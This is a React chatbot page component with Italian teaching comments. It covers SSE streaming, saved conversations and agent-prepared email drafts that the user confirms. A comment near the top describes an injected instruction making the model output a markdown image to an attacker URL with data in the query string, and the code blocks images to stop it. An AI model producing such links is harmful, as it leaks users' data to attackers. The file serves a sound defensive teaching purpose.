import { useCallback, useEffect, useRef, useState } from 'react';
import { useNavigate, useParams } from 'react-router';
import Markdown from 'react-markdown'
import { API_BASE_URL } from '../config';
import EmailDraftsPanel from '../components/EmailDraftsPanel';


const CHAT_API_URL = `${API_BASE_URL}/api/chat`;
const CONVERSATIONS_API_URL = `${CHAT_API_URL}/conversations`;
const EMAIL_DRAFTS_API_URL = `${API_BASE_URL}/api/email-drafts`;

// Lezione 8 (guardrail, strato "output"): la risposta del modello è un input NON fidato.
// - react-markdown NON interpreta l'HTML contenuto nel testo (non aggiungere rehype-raw!)
// - niente immagini: un'istruzione malevola potrebbe far generare ![](https://attaccante.com/?dati=...)
//   e il browser, per mostrarla, consegnerebbe i dati all'attaccante
// - i link si aprono in una nuova scheda senza passare informazioni alla pagina di destinazione
const MARKDOWN_DISALLOWED = ['img'];
const MARKDOWN_COMPONENTS = {
  a: ({ href, children }) => (
    <a href={href} target="_blank" rel="noopener noreferrer nofollow" className="underline">
      {children}
    </a>
  ),
};

// Invia il messaggio e legge la risposta in streaming (Server-Sent Events).
// Ogni evento SSE è separato da una riga vuota e contiene una o più righe "data:".
// Esempio di ciò che arriva dal backend:
//   data:La\n\n
//   data: configur\n\n      <- lo spazio fa parte del token: NON va tolto
//   data::\ndata:\n\n        <- più righe "data:" = il token contiene degli a capo
//
// Lezione 5: non inviamo più lo storico. Mandiamo solo l'ID della conversazione:
// è il backend (ChatMemory di Spring AI) a ricordare i messaggi precedenti.
async function streamChat(message, conversationId, onToken) {
  const response = await fetch(CHAT_API_URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      Accept: 'text/event-stream',
    },
    body: JSON.stringify({ message, conversationId }),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => null);
    throw new Error(
      data?.message ||
      (response.status === 400 ? 'Messaggio non valido (vuoto o troppo lungo).'
        : response.status === 429 ? 'Hai inviato troppi messaggi: aspetta qualche secondo e riprova.'
        : `Errore del server (${response.status}).`)
    );
  }

  const reader = response.body.getReader();
  const decoder = new TextDecoder();
  let buffer = '';

  while (true) {
    const { value, done } = await reader.read();
    if (done) break;

    // I byte possono arrivare spezzati a metà evento: li accumuliamo nel buffer
    buffer += decoder.decode(value, { stream: true }).replace(/\r\n/g, '\n');

    let separatorIndex;
    while ((separatorIndex = buffer.indexOf('\n\n')) !== -1) {
      const rawEvent = buffer.slice(0, separatorIndex);
      buffer = buffer.slice(separatorIndex + 2);

      // Togliamo solo il prefisso "data:" (5 caratteri), senza trim:
      // Spring non mette lo spazio dopo i due punti, quindi gli spazi sono del testo.
      const token = rawEvent
        .split('\n')
        .filter(line => line.startsWith('data:'))
        .map(line => line.slice(5))
        .join('\n');

      if (token) onToken(token);
    }
  }
}

function formatChatDate(isoDate) {
  const date = new Date(isoDate);
  const isToday = date.toDateString() === new Date().toDateString();
  return isToday
    ? date.toLocaleTimeString('it-IT', { hour: '2-digit', minute: '2-digit' })
    : date.toLocaleDateString('it-IT', { day: '2-digit', month: 'short' });
}

function ChatBot() {
  // L'ID della chat aperta è nell'indirizzo: /chat/<conversationId>
  // Senza ID (/chat) siamo in una chat nuova, non ancora salvata.
  const { conversationId } = useParams();
  const navigate = useNavigate();

  const [conversations, setConversations] = useState([]);
  const [emailDrafts, setEmailDrafts] = useState([]);
  const [messages, setMessages] = useState([]);
  const [messageInput, setMessageInput] = useState('');
  const [isSending, setIsSending] = useState(false);
  const [isLoadingMessages, setIsLoadingMessages] = useState(false);
  const [requestError, setRequestError] = useState('');
  const messagesEndRef = useRef(null);

  // Quando creiamo noi una chat (primo messaggio) cambiamo l'indirizzo mentre la risposta
  // è ancora in streaming: in quel caso NON dobbiamo ricaricare i messaggi dal backend.
  const createdConversationIdRef = useRef(null);

  const loadConversations = useCallback(() =>
    fetch(CONVERSATIONS_API_URL)
      .then(response => (response.ok ? response.json() : []))
      .then(setConversations)
      .catch(() => setConversations([])),
  []);

  // Lezione 6: bozze email preparate dall'agente e in attesa di conferma
  const loadEmailDrafts = useCallback(() =>
    fetch(EMAIL_DRAFTS_API_URL)
      .then(response => (response.ok ? response.json() : []))
      .then(setEmailDrafts)
      .catch(() => setEmailDrafts([])),
  []);

  async function updateDraft(draft, method, path) {
    const response = await fetch(`${EMAIL_DRAFTS_API_URL}/${draft.id}${path}`, { method });
    await loadEmailDrafts();
    if (!response.ok) {
      throw new Error(response.status === 502
        ? 'Server email non raggiungibile: la bozza resta in attesa.'
        : 'Operazione non riuscita: la bozza potrebbe essere già stata gestita.');
    }
  }

  // 1. All'apertura della pagina: elenco delle chat salvate e bozze email in attesa
  useEffect(() => {
    loadConversations();
    loadEmailDrafts();
  }, [loadConversations, loadEmailDrafts]);

  // 2. Quando cambia la chat aperta: carichiamo i suoi messaggi
  useEffect(() => {
    if (conversationId && conversationId === createdConversationIdRef.current) {
      return undefined; // chat appena creata da noi: i messaggi sono già a schermo
    }

    let ignore = false; // evita di mostrare i messaggi di una chat che nel frattempo è stata cambiata

    const request = conversationId
      ? fetch(`${CONVERSATIONS_API_URL}/${conversationId}/messages`)
          .then(response => (response.ok ? response.json() : []))
      : Promise.resolve([]);

    request
      .then(data => { if (!ignore) setMessages(data); })
      .catch(() => { if (!ignore) setRequestError('Impossibile caricare la chat.'); })
      .finally(() => { if (!ignore) setIsLoadingMessages(false); });

    return () => { ignore = true; };
  }, [conversationId]);

  useEffect(() => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' });
  }, [messages, isSending]);

  function openConversation(id) {
    if (isSending || id === conversationId) return;
    createdConversationIdRef.current = null;
    setRequestError('');
    if (id) setIsLoadingMessages(true);
    navigate(id ? `/chat/${id}` : '/chat');
  }

  async function deleteConversation(conversation) {
    if (!window.confirm(`Eliminare la chat "${conversation.title}"?`)) return;

    const response = await fetch(`${CONVERSATIONS_API_URL}/${conversation.id}`, { method: 'DELETE' });
    if (!response.ok && response.status !== 404) {
      setRequestError('Impossibile eliminare la chat.');
      return;
    }

    await loadConversations();
    if (conversation.id === conversationId) openConversation(null);
  }

  async function sendMessage(event) {
    event.preventDefault();
    const message = messageInput.trim();

    if (!message || isSending) return;

    // Chat nuova: generiamo noi l'ID (UUID, 36 caratteri) e lo mettiamo nell'indirizzo
    let activeConversationId = conversationId;
    if (!activeConversationId) {
      activeConversationId = crypto.randomUUID();
      createdConversationIdRef.current = activeConversationId;
      navigate(`/chat/${activeConversationId}`, { replace: true });
    }

    // Aggiungiamo la domanda e una risposta vuota che riempiremo token per token
    setMessages(currentMessages => [
      ...currentMessages,
      { role: 'user', content: message },
      { role: 'assistant', content: '' },
    ]);
    setMessageInput('');
    setRequestError('');
    setIsSending(true);

    let receivedText = '';

    try {
      await streamChat(message, activeConversationId, token => {
        receivedText += token;
        setMessages(currentMessages => {
          const updated = [...currentMessages];
          updated[updated.length - 1] = { role: 'assistant', content: receivedText };
          return updated;
        });
      });

      if (!receivedText.trim()) {
        throw new Error('Il backend non ha restituito alcuna risposta.');
      }
    } catch (error) {
      if (!receivedText.trim()) {
        // Nessun testo ricevuto: togliamo domanda e risposta vuota e rimettiamo il testo nell'input
        setMessages(currentMessages => currentMessages.slice(0, -2));
        setMessageInput(currentInput => currentInput || message);
      }
      setRequestError(
        error.message || 'Non è stato possibile inviare il messaggio. Riprova.'
      );
    } finally {
      setIsSending(false);
      loadConversations(); // nuova chat in elenco / data di aggiornamento
      loadEmailDrafts();   // l'agente potrebbe aver preparato una bozza
    }
  }

  function handleInputKeyDown(event) {
    if (event.key === 'Enter' && !event.shiftKey) {
      event.preventDefault();
      event.currentTarget.form?.requestSubmit();
    }
  }

  return (
    <main className="min-h-screen bg-slate-50 p-4 sm:p-6 lg:p-10">
      <div className="mx-auto flex min-h-[calc(100vh-2rem)] max-w-6xl flex-col sm:min-h-[calc(100vh-3rem)] lg:min-h-[calc(100vh-5rem)]">
        <header className="mb-6 border-b border-slate-200 pb-6">
          <p className="mb-2 text-sm font-semibold uppercase tracking-[0.16em] text-indigo-600">
            Gestionale
          </p>
          <h1 className="text-3xl font-bold tracking-tight text-slate-950 sm:text-4xl">
            Assistente AI
          </h1>
          <p className="mt-2 text-sm leading-6 text-slate-600 sm:text-base">
            Fai una domanda sui documenti caricati: l'assistente ricorda la conversazione e le chat restano salvate.
          </p>
        </header>

        <div className="flex flex-1 flex-col gap-4 lg:flex-row">
          {/* ===== ELENCO DELLE CHAT ===== */}
          <aside
            aria-label="Le tue chat"
            className="flex max-h-72 shrink-0 flex-col overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-sm lg:max-h-none lg:w-72"
          >
            <div className="border-b border-slate-100 p-3">
              <button
                type="button"
                onClick={() => openConversation(null)}
                disabled={isSending}
                className="flex w-full items-center justify-center gap-2 rounded-xl bg-indigo-600 px-4 py-2.5 text-sm font-semibold text-white shadow-sm transition hover:bg-indigo-700 focus:outline-none focus:ring-4 focus:ring-indigo-200 disabled:cursor-not-allowed disabled:opacity-50"
              >
                <i className="bi bi-plus-lg" aria-hidden="true" />
                Nuova chat
              </button>
            </div>

            <nav className="flex-1 overflow-y-auto p-2">
              {conversations.length === 0 && (
                <p className="px-3 py-4 text-center text-xs text-slate-400">
                  Nessuna chat salvata
                </p>
              )}

              <ul className="space-y-1">
                {conversations.map(conversation => {
                  const isActive = conversation.id === conversationId;
                  return (
                    <li key={conversation.id} className="group relative">
                      <button
                        type="button"
                        onClick={() => openConversation(conversation.id)}
                        disabled={isSending && !isActive}
                        aria-current={isActive ? 'page' : undefined}
                        title={conversation.title}
                        className={`w-full rounded-xl py-2.5 pl-3 pr-9 text-left transition disabled:cursor-not-allowed disabled:opacity-50 ${
                          isActive ? 'bg-indigo-50 text-indigo-700' : 'text-slate-700 hover:bg-slate-100'
                        }`}
                      >
                        <span className="block truncate text-sm font-medium">{conversation.title}</span>
                        <span className="block text-xs text-slate-400">{formatChatDate(conversation.updatedAt)}</span>
                      </button>
                      <button
                        type="button"
                        onClick={() => deleteConversation(conversation)}
                        disabled={isSending}
                        aria-label={`Elimina la chat ${conversation.title}`}
                        className="absolute right-1.5 top-1/2 flex h-7 w-7 -translate-y-1/2 items-center justify-center rounded-lg text-slate-400 opacity-0 transition hover:bg-red-50 hover:text-red-600 focus:opacity-100 group-hover:opacity-100 disabled:hidden"
                      >
                        <i className="bi bi-trash3 text-xs" aria-hidden="true" />
                      </button>
                    </li>
                  );
                })}
              </ul>
            </nav>
          </aside>

          {/* ===== CONVERSAZIONE ===== */}
          <section
            aria-label="Conversazione con l'assistente"
            className="flex min-h-[28rem] min-w-0 flex-1 flex-col overflow-hidden rounded-2xl border border-slate-200 bg-white shadow-sm"
          >
            <div
              className="flex-1 space-y-5 overflow-y-auto p-4 sm:p-6"
              aria-live="polite"
              aria-relevant="additions"
            >
              {isLoadingMessages && (
                <p className="py-10 text-center text-sm text-slate-400" role="status">
                  Caricamento della chat...
                </p>
              )}

              {!isLoadingMessages && messages.length === 0 && (
                <div className="flex h-full min-h-64 flex-col items-center justify-center px-4 text-center">
                  <span className="flex h-14 w-14 items-center justify-center rounded-2xl bg-indigo-50 text-indigo-600">
                    <i className="bi bi-chat-dots text-2xl" aria-hidden="true" />
                  </span>
                  <h2 className="mt-4 text-base font-semibold text-slate-900">
                    Come posso aiutarti?
                  </h2>
                  <p className="mt-1 max-w-sm text-sm leading-6 text-slate-500">
                    Scrivi un messaggio qui sotto per iniziare una nuova chat.
                  </p>
                </div>
              )}

              {!isLoadingMessages && messages.map((message, index) => {
                const isUser = message.role === 'user';

                // La risposta vuota (in attesa del primo token) non viene mostrata
                if (!isUser && !message.content) return null;

                return (
                  <article
                    key={`${message.role}-${index}`}
                    className={`flex items-start gap-3 ${isUser ? 'flex-row-reverse' : ''}`}
                  >
                    <span
                      className={`flex h-9 w-9 shrink-0 items-center justify-center rounded-xl ${
                        isUser
                          ? 'bg-indigo-600 text-white'
                          : 'bg-slate-100 text-slate-600'
                      }`}
                      aria-hidden="true"
                    >
                      <i className={`bi ${isUser ? 'bi-person' : 'bi-robot'}`} />
                    </span>
                    <div
                      className={`max-w-[85%] whitespace-pre-wrap break-words rounded-2xl px-4 py-3 text-sm leading-6 sm:max-w-[75%] ${
                        isUser
                          ? 'rounded-tr-md bg-indigo-600 text-white'
                          : 'rounded-tl-md bg-slate-100 text-slate-800'
                      }`}
                    >
                      <Markdown disallowedElements={MARKDOWN_DISALLOWED} components={MARKDOWN_COMPONENTS}>
                        {message.content}
                      </Markdown>
                    </div>
                  </article>
                );
              })}

              {isSending && !messages[messages.length - 1]?.content && (
                <div className="flex items-start gap-3" role="status">
                  <span className="flex h-9 w-9 shrink-0 items-center justify-center rounded-xl bg-slate-100 text-slate-600">
                    <i className="bi bi-robot" aria-hidden="true" />
                  </span>
                  <p className="rounded-2xl rounded-tl-md bg-slate-100 px-4 py-3 text-sm text-slate-500">
                    Sto elaborando la risposta...
                  </p>
                </div>
              )}
              <div ref={messagesEndRef} />
            </div>

            <EmailDraftsPanel
              drafts={emailDrafts}
              onSend={draft => updateDraft(draft, 'POST', '/send')}
              onDiscard={draft => updateDraft(draft, 'DELETE', '')}
            />

            <div className="border-t border-slate-100 p-4 sm:p-5">
              {requestError && (
                <p role="alert" className="mb-3 rounded-xl bg-red-50 px-4 py-3 text-sm text-red-700">
                  {requestError}
                </p>
              )}

              <form onSubmit={sendMessage} className="flex items-end gap-3">
                <label htmlFor="chat-message" className="sr-only">
                  Scrivi un messaggio
                </label>
                <textarea
                  id="chat-message"
                  value={messageInput}
                  onChange={event => setMessageInput(event.target.value)}
                  onKeyDown={handleInputKeyDown}
                  placeholder="Scrivi il tuo messaggio..."
                  rows={2}
                  maxLength={4000}
                  disabled={isSending || isLoadingMessages}
                  className="max-h-40 min-h-12 flex-1 resize-y rounded-xl border border-slate-200 bg-slate-50 px-4 py-3 text-sm text-slate-900 outline-none transition placeholder:text-slate-400 focus:border-indigo-500 focus:bg-white focus:ring-4 focus:ring-indigo-100 disabled:opacity-60"
                />
                <button
                  type="submit"
                  disabled={isSending || isLoadingMessages || !messageInput.trim()}
                  aria-label="Invia messaggio"
                  className="flex h-12 w-12 shrink-0 items-center justify-center rounded-xl bg-indigo-600 text-white shadow-sm transition hover:bg-indigo-700 focus:outline-none focus:ring-4 focus:ring-indigo-200 disabled:cursor-not-allowed disabled:opacity-50"
                >
                  <i className={`bi ${isSending ? 'bi-hourglass-split' : 'bi-send-fill'}`} aria-hidden="true" />
                </button>
              </form>
              <p className="mt-2 text-xs text-slate-400">
                Invio per spedire · Shift+Invio per andare a capo
              </p>
            </div>
          </section>
        </div>
      </div>
    </main>
  );
}

export default ChatBot;
